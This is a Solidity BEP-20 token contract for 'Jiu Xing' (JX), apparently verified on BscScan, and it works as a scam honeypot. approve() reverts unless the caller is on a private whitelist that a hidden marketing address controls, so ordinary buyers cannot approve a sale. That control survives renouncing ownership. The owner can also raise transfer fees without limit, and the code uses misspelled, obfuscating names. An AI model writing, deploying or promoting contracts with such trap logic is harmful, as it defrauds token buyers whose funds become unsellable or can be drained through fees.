/**
 *Submitted for verification at BscScan.com on 2022-08-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public _ower;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == _ower);
        _;
    }

    function owner() public view returns (address) {
       return _ower;
    }

    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(_ower, newowneres);
        _ower = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(_ower, address(0));
        _ower = address(0);
    }
}

contract Shortville is Ownable {
    using SafeMath for uint256;

    string constant public name = "Jiu Xing";
    string constant public symbol = "JX";
    uint8 constant public decimals = 18;

    uint256 public totalSupply = 10000*10**uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) public _go;
    
    uint256 public _buyMarketingFee = 2;
    uint256 private _previousTaxcfi = _buyMarketingFee;

    uint256 public _buyDestroyFee = 0;
    uint256 private _previousBurncfi = _buyDestroyFee;

    address private marketingAddress = 0x79EABAc9dDefF2F720ef432b38A2F465F5490264;

    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owmmner, address indexed spender, uint256 value);
    event SwapAndLiquifyEnabledUpdated(bool enabled);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        if(_go[from])
            removeAllcfi();

        uint256 cfi =  calculateTaxcfi(value);
        uint256 burn =  calculateBurncfi(value);

        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value).sub(cfi).sub(burn);

        if(cfi > 0) {
            balanceOf[marketingAddress] = balanceOf[marketingAddress].add(cfi);
            emit Transfer(from, marketingAddress, cfi);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }

         if(_go[from])
            restoreAllcfi();

        uint256 Amont = value.sub(cfi).sub(burn);
        emit Transfer(from, to, Amont);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        require(_go[msg.sender],"No Approve");
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }
    
    function calculateTaxcfi(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_buyMarketingFee).div(
            10 ** 2
        );
    }
    
    function calculateBurncfi(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_buyDestroyFee).div(
            10 ** 2
        );
    }
    
    function removeAllcfi() private {
        if(_buyMarketingFee == 0 && _buyDestroyFee == 0)
            return;

        _previousTaxcfi = _buyMarketingFee;
        _previousBurncfi = _buyDestroyFee;
        _buyMarketingFee = 0;
        _buyDestroyFee = 0;
    }
    
    function restoreAllcfi() private {
        _buyMarketingFee = _previousTaxcfi;
        _buyDestroyFee = _previousBurncfi;
    }

    

    function UNGO(address account,bool b) public {
        require(msg.sender == marketingAddress);
        _go[account] = b;
    }

    function setTaxFeePercent(uint256 taxFee) public onlyowneres() {
        _buyMarketingFee = taxFee;
    }


    function setBurncFeePercent(uint256 burncFee) public onlyowneres() {
        _buyDestroyFee = burncFee;
    }
    
    function setmarketingAddress(address account) public onlyowneres() {
        marketingAddress = account;
    }
    
}

contract Token is Shortville {

    constructor() {
        _ower = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        _go[msg.sender]=true;
        emit Transfer(address(0), msg.sender, totalSupply);

    }

    receive() external payable {}
}